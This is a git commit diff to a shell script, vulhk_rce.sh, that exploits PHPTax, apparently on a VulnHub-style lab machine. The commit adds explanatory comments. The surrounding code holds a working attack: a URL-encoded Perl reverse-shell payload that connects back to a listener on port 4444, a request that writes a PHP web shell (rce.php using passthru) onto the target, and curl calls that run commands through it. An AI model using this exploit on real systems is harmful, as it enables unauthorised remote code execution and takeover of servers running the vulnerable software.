6cd88d11accf375f59f3d1fcad2e4029c265b7b8
ianeyinda <154763481+ianeyinda@users.noreply.github.com>
2024-03-22 01:41:09 +0300

    Update vulhk_rce.sh

--- vulhk_rce.sh
+++ vulhk_rce.sh
@@ -2,16 +2,23 @@
 
 #things to be changed : payload, url 
 
+#the reverse shell can be generate from revshells.com or from any reverse shell generator
 payload="perl%20-e%20%27use%20Socket%3B%24i%3D%22172.16.62.133%22%3B%24p%3D4444%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22sh%20-i%22%29%3B%7D%3B%27"
+
+# the url for the running application (phptax) 
 url="http://172.16.62.134:8080/phptax/"
+
+# the url going to be used to creat a file to enable rce(rce.php) 
 file="index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E"
+
 # creating rce.php on the target
 function create_rce {
         curl -A -s "Mozilla/4.0" $url$file
 }
+
 # exploiting the target
 function exploiting {
-        curl -A "Mozilla/4.0" http://172.16.62.134:8080/phptax/data/rce.php?cmd=$1
+        curl -A "Mozilla/4.0" http://172.16.62.134:8080/phptax/data/rce.php?cmd=$1 #change this url to the where the application ip is for you case
 
 }
 
